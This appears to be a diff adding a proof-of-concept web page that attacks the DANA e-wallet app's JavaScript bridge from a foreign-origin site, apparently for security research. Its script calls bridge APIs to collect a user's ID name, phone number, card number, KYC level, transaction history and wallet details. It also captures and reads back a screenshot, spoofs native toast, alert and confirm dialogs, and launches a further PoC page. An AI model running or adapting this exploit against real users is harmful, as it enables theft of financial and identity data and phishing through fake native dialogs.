@@ -1,0 +1,178 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>DANA H5 Bridge Test v4</title>
+<style>
+  body{font-family:monospace;background:#111;color:#0f0;padding:12px;font-size:12px;margin:0;padding-top:24px}
+  h3{color:#ff0;margin:14px 0 4px;font-size:13px}
+  .ok{color:#0f0}.err{color:#f55}.pending{color:#888}
+  pre{white-space:pre-wrap;word-break:break-all;background:#000;padding:8px;border:1px solid #333;margin:4px 0;max-height:260px;overflow:auto}
+  button{background:#050;color:#0f0;border:1px solid #0f0;padding:14px;margin:8px 0;font-size:15px;width:100%}
+  #status{position:fixed;top:0;left:0;right:0;background:#330;color:#ff0;padding:5px;font-size:11px;z-index:9}
+  img.shot{max-width:100%;border:2px solid #ff0;display:block;margin:6px 0}
+  .note{color:#0ff;margin:4px 0}
+</style>
+</head>
+<body>
+<div id="status">v4 starting...</div>
+<h3 style="color:#0ff">v4 - read-back + appId matrix + UI spoof + cache path</h3>
+<p class="note">Let this page run by itself until status says DONE (~45s). Then COPY results. Last step: tap the callSubApp button. If a native toast or dialog pops up at [8]/[9]/[10], that itself is a finding - note it.</p>
+
+<h3>[0] env</h3><pre id="p-0" class="pending">pending</pre>
+<h3>[1] getUserInfoData {getUserInfo} early</h3><pre id="p-1" class="pending">pending</pre>
+<h3>[2] getUserInformation {queryBy} (20s)</h3><pre id="p-2" class="pending">pending</pre>
+<h3>[3] trx history forceCache:false</h3><pre id="p-3" class="pending">pending</pre>
+<h3>[4] trx history forceCache:true (cache path)</h3><pre id="p-4" class="pending">pending</pre>
+<h3>[5] getNativeData danaWalletDetail</h3><pre id="p-5" class="pending">pending</pre>
+<h3>[6] screenshot {poc_v4}</h3><pre id="p-6" class="pending">pending</pre>
+<h3>[7] screenshot READ-BACK (fetch / img / canvas)</h3><pre id="p-7" class="pending">pending</pre><div id="p-7-img"></div>
+<h3>[8] toast (native UI spoof)</h3><pre id="p-8" class="pending">pending</pre>
+<h3>[9] alert dialog (native UI spoof)</h3><pre id="p-9" class="pending">pending</pre>
+<h3>[10] confirm dialog (native UI spoof)</h3><pre id="p-10" class="pending">pending</pre>
+<h3>[11] getStartupParams</h3><pre id="p-11" class="pending">pending</pre>
+<h3>[12] getUserInfoData {getUserInfo} late (cache-warm check)</h3><pre id="p-12" class="pending">pending</pre>
+
+<button onclick="goSub()">LAST STEP: OPEN p2batt.html VIA callSubApp</button>
+<h3>[13] callSubApp</h3><pre id="p-13" class="pending">tap the button above</pre>
+<button onclick="copyAll()">COPY ALL RESULTS</button>
+
+<script>
+(function(){
+  var RESULTS = {};
+  function set(id, obj, cls){
+    var el = document.getElementById(id);
+    el.className = cls || 'ok';
+    try { el.textContent = (typeof obj === 'string') ? obj : JSON.stringify(obj, null, 1); } catch(e) { el.textContent = String(obj); }
+    RESULTS[id] = obj;
+  }
+  var statusEl = document.getElementById('status');
+  function status(t){ statusEl.textContent = t; }
+
+  function bridgeReady(cb){
+    if (window.AlipayJSBridge) return cb();
+    document.addEventListener('AlipayJSBridgeReady', function(){ cb(); }, false);
+    setTimeout(cb, 5000);
+  }
+
+  function call(api, param, timeoutMs){
+    return new Promise(function(resolve){
+      var done = false;
+      var t = setTimeout(function(){ if(!done){ done = true; resolve({__timeout:true, waitedMs:timeoutMs||12000}); } }, timeoutMs || 12000);
+      try {
+        window.AlipayJSBridge.call(api, param || {}, function(r){
+          if (!done) { done = true; clearTimeout(t); resolve(r); }
+        });
+      } catch(e) {
+        if (!done) { done = true; clearTimeout(t); resolve({__exception:String(e)}); }
+      }
+    });
+  }
+
+  window.goSub = async function(){
+    set('p-13', 'calling callSubApp...');
+    var r = await call('callSubApp', {url:'https://rfypych.github.io/poc/p2batt.html'}, 8000);
+    set('p-13', r);
+  };
+
+  window.copyAll = function(){
+    var lines = [];
+    Object.keys(RESULTS).forEach(function(k){
+      lines.push(k + ': ' + (typeof RESULTS[k] === 'string' ? RESULTS[k] : JSON.stringify(RESULTS[k])));
+    });
+    var txt = 'v4 @ ' + location.href + ' ua=' + navigator.userAgent.slice(0,80) + '\n' + lines.join('\n');
+    var ta = document.createElement('textarea');
+    ta.value = txt; document.body.appendChild(ta); ta.select();
+    try { document.execCommand('copy'); status('copied - paste it back'); } catch(e) { status('copy failed - screenshot this page'); }
+    document.body.removeChild(ta);
+  };
+
+  bridgeReady(async function(){
+    try {
+      var sp = {};
+      try { sp = (window.AlipayJSBridge && window.AlipayJSBridge.startupParams) || {}; } catch(e) { sp = {err:String(e)}; }
+      set('p-0', { hasAlipayJSBridge: !!window.AlipayJSBridge, appId: sp.appId, startupParams: sp, href: location.href });
+    } catch(e) { set('p-0', {error:String(e)}, 'err'); }
+
+    status('[1/12] getUserInfoData early');
+    set('p-1', await call('getUserInfoData', {event:'getUserInfo'}, 15000));
+
+    status('[2/12] getUserInformation queryBy');
+    set('p-2', await call('getUserInfoData', {event:'getUserInformation', info:{queryBy:'ktpName,globalPhoneNumber,userPan,userId,kycLevel'}}, 20000));
+
+    status('[3/12] trx forceCache:false');
+    set('p-3', await call('getTransactionHistoryList', {event:'getInitList', pageNum:1, forceCache:false}, 15000));
+
+    status('[4/12] trx forceCache:true');
+    set('p-4', await call('getTransactionHistoryList', {event:'getInitList', pageNum:1, forceCache:true}, 15000));
+
+    status('[5/12] getNativeData');
+    set('p-5', await call('getNativeData', {dataName:'danaWalletDetail'}, 12000));
+
+    status('[6/12] screenshot');
+    var shot = await call('screenshot', {name:'poc_v4'}, 15000);
+    set('p-6', shot);
+
+    status('[7/12] screenshot read-back');
+    var rb = {fileURL: shot && shot.fileURL};
+    if (shot && shot.fileURL) {
+      try {
+        var r = await fetch(shot.fileURL);
+        var e1 = {fetchStatus: r.status, fetchType: r.type};
+        try { var b = await r.blob(); e1.blobSize = b.size; } catch(e) { e1.blobErr = String(e); }
+        rb.fetch = e1;
+      } catch(e) { rb.fetch = {error: String(e)}; }
+      await new Promise(function(res){
+        var settled = false;
+        function fin(){ if(!settled){ settled = true; res(); } }
+        var img = new Image();
+        img.onload = function(){
+          rb.img = {ok:true, w:img.naturalWidth, h:img.naturalHeight};
+          try {
+            var c = document.createElement('canvas');
+            c.width = img.naturalWidth; c.height = img.naturalHeight;
+            c.getContext('2d').drawImage(img, 0, 0);
+            var u = c.toDataURL('image/png');
+            rb.canvas = {ok:true, dataLen:u.length, head:u.slice(0,48)};
+            var t = document.createElement('img'); t.src = u; t.className = 'shot';
+            document.getElementById('p-7-img').appendChild(t);
+            rb.renderedFrom = 'canvas-dataurl (full read + exfil possible)';
+          } catch(e) {
+            rb.canvas = {ok:false, error:String(e)};
+            try {
+              var t2 = document.createElement('img'); t2.src = shot.fileURL; t2.className = 'shot';
+              document.getElementById('p-7-img').appendChild(t2);
+              rb.renderedFrom = 'content-uri direct (readable, canvas tainted)';
+            } catch(e2) {}
+          }
+          set('p-7', rb); fin();
+        };
+        img.onerror = function(){ rb.img = {ok:false}; set('p-7', rb); fin(); };
+        setTimeout(fin, 8000);
+        img.src = shot.fileURL;
+      });
+    } else { rb.note = 'no fileURL in screenshot result'; }
+    set('p-7', rb);
+
+    status('[8/12] toast');
+    set('p-8', await call('toast', {content:'DANA v4 native toast triggered from foreign origin', type:'none', duration:3000}, 8000));
+
+    status('[9/12] alert dialog');
+    set('p-9', await call('alert', {title:'DANA', message:'[PoC TEST] This native dialog was triggered by a foreign-origin page (rfypych.github.io). If you can read this, native dialog spoofing works. Press OK.', button:'OK'}, 20000));
+
+    status('[10/12] confirm dialog');
+    set('p-10', await call('confirm', {title:'DANA', message:'[PoC TEST] Foreign-origin confirm dialog. Tap either button.', okButton:'OK', cancelButton:'CANCEL'}, 25000));
+
+    status('[11/12] getStartupParams');
+    set('p-11', await call('getStartupParams', {}, 8000));
+
+    status('[12/12] getUserInfoData late');
+    set('p-12', await call('getUserInfoData', {event:'getUserInfo'}, 15000));
+
+    status('DONE - copy results, then tap the callSubApp button');
+  });
+})();
+</script>
+</body>
+</html>
